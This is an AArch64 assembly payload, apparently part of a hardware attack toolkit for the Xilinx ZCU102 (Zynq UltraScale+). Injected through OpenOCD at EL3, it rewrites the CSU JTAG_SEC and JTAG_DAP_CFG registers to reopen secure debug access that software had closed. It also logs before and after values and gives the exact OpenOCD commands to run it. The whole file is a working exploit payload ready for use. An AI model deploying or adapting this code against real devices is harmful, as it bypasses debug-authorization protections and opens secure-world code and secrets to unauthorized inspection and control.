// reopen-gates.S — A53 EL3 direct CPU write of the debug-authorization gates.
//
// Tier-1 "code-exec on a core" unlock. reopen-debug.tcl writes CSU.JTAG_SEC /
// CSU.JTAG_DAP_CFG from the *DAP side* (the external AXI-AP). When that path is
// filtered (master-aware AXI filter) but not eFuse-locked, a core running at
// EL3-secure can still perform the same writes from the *CPU side*. This payload
// does exactly that: read-modify-write JTAG_SEC |= 0x1FF and JTAG_DAP_CFG |= 0xFF
// (OR, so unrelated bits are preserved), recording before/after so the host can
// tell whether the write stuck (software-closed → re-opened) or was ignored
// (eFuse-locked → no CPU-side write either).
//
// Delivered by inject.tcl COLD mode (halt core 0, reset into EL3, run, OS frozen).
// Fully absolute-addressed (CSU regs + OCM result region), so it is independent of
// the load address inject.tcl picks.
//
// Result region (OCM @ 0xFFFE0000):
//   +0x00  JTAG_SEC      before
//   +0x04  JTAG_SEC      after
//   +0x08  JTAG_DAP_CFG  before
//   +0x0C  JTAG_DAP_CFG  after
// Done marker @ 0xFFFE7000 = 0xCAFEC0DE  (inject.tcl's default INJECT_DONE_VAL).
//
// Run via the wrapper:
//   openocd -f openocd/zcu102.cfg -c "init; source openocd/reopen-via-code.tcl; shutdown"
// or directly through inject.tcl:
//   openocd -f openocd/zcu102.cfg -c "init; \
//     set ::INJECT_BIN payloads/reopen-gates.bin; set ::INJECT_ADDR 0xFFFC0100; \
//     set ::INJECT_DONE_ADDR 0xFFFE7000; set ::INJECT_DONE_VAL 0xCAFEC0DE; \
//     set ::INJECT_RESULT_ADDR 0xFFFE0000; set ::INJECT_RESULT_LEN 4; \
//     source openocd/inject.tcl; shutdown"

.equ JTAG_SEC,      0xFFCA0038
.equ JTAG_DAP_CFG,  0xFFCA003C
.equ SEC_OPEN,      0x1FF          // DAP_SEC|PLTAP_SEC|PMU_SEC all 0b111
.equ DAP_OPEN,      0xFF           // APU+RPU DBGEN/NIDEN/SPIDEN/SPNIDEN
.equ RESULT_BASE,   0xFFFE0000
.equ DONE_ADDR,     0xFFFE7000
.equ DONE_VAL,      0xCAFEC0DE

.section .text
.global _start

.macro load_addr reg, addr
    movz    \reg, #((\addr) & 0xFFFF)
    movk    \reg, #(((\addr) >> 16) & 0xFFFF), lsl #16
.endm

_start:
    load_addr x10, RESULT_BASE

    // ---- JTAG_SEC: read-modify-write |= 0x1FF ----
    load_addr x1, JTAG_SEC
    ldr     w2, [x1]
    str     w2, [x10, #0x00]           // before
    movz    w3, #SEC_OPEN
    orr     w2, w2, w3
    str     w2, [x1]                   // CPU-side write
    dsb     sy
    ldr     w2, [x1]
    str     w2, [x10, #0x04]           // after (read-back)

    // ---- JTAG_DAP_CFG: read-modify-write |= 0xFF ----
    load_addr x1, JTAG_DAP_CFG
    ldr     w2, [x1]
    str     w2, [x10, #0x08]           // before
    movz    w3, #DAP_OPEN
    orr     w2, w2, w3
    str     w2, [x1]                   // CPU-side write
    dsb     sy
    ldr     w2, [x1]
    str     w2, [x10, #0x0C]           // after (read-back)

    // ---- done marker ----
    load_addr x1, DONE_ADDR
    movz    w2, #(DONE_VAL & 0xFFFF)
    movk    w2, #((DONE_VAL >> 16) & 0xFFFF), lsl #16
    str     w2, [x1]
    dsb     sy

spin:
    b       spin
